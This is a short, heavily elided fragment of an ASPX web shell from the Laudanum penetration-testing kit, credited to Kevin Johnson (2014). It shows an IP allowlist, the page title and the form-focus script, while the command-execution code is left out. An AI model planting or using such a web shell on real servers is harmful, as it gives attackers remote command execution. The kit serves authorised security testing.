...
string stderr = "";
			...
			void Page_Load(object sender, System.EventArgs e) {
				...
				string[] allowedIps = new string[] { "::1", "192.168.0.1", "10.10.15.8" };
	...
	bool validIp = false;
		...
		<head>
			<title>Laundanum ASPX Shell</title>
		</head>
		...
		<body onload="document.shell.c.focus()">
			...
			<hr />
			<address>
				Copyright &copy; 2014, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum
				team.<br />
